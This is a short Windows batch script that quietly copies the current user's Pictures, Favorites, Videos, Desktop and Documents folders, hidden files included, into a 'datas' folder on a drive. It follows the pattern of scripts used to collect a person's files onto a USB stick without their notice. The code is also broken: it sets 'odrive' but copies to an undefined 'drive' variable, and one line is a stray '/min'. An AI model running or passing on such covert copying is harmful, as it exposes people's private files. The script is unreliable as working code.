@echo off
:: variables
/min
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y
echo off
%backupcmd% "%USERPROFILE%\Pictures" "%drive%\datas\Pictures"
%backupcmd% "%USERPROFILE%\Favorites" "%drive%\datas\Favorites"
%backupcmd% "%USERPROFILE%\Videos" "%drive%\datas\Videos"
%backupcmd% "%USERPROFILE%\Desktop" "%drive%\datas\Desktop"
%backupcmd% "%USERPROFILE%\Documents" "%drive%\datas\Documents"
@echo off
cls